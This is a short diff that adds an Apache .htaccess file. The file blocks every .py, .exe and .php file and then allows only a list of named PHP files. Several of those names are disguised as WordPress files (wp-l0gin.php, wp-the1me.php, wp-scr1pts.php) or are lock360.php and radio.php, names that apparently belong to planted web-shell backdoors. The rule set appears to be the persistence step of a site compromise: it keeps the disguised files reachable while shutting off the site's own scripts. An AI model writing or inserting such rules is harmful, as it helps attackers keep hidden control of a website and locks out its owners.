@@ -1,0 +1,8 @@
+<FilesMatch ".(py|exe|php)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(lock360.php|wp-l0gin.php|wp-the1me.php|wp-scr1pts.php|radio.php|index.php|content.php|about.php|wp-login.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
